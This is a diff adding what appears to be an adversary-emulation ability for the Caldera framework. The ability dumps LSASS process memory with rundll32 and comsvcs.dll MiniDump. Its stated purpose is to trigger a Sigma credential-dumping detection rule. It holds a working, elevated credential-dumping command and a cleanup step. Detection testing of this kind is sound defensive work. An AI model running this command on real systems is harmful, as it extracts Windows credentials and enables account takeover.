@@ -1,0 +1,21 @@
+- id: 9e0f1a2b-3c4d-4e5f-9a8b-7c6d5e4f3a2b
+  name: T1003.001 - LSASS Dump via comsvcs.dll (LOLBin)
+  description: |
+    Dump LSASS via la technique LOLBin la plus utilisée par les attaquants :
+    rundll32.exe + comsvcs.dll!MiniDump. Cible : déclencher la règle Sigma
+    `credential_dumping_lsass.yml` (GrantedAccess 0x1FFFFF).
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: LSASS Memory
+  platforms:
+    windows:
+      cmd:
+        command: |
+          for /f "tokens=2" %a in ('tasklist ^| findstr /i lsass') do (
+            rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %a C:\Windows\Temp\caldera_lsass.dmp full
+          )
+        cleanup: |
+          del /F /Q C:\Windows\Temp\caldera_lsass.dmp 2>nul
+        timeout: 60
+        elevated: true
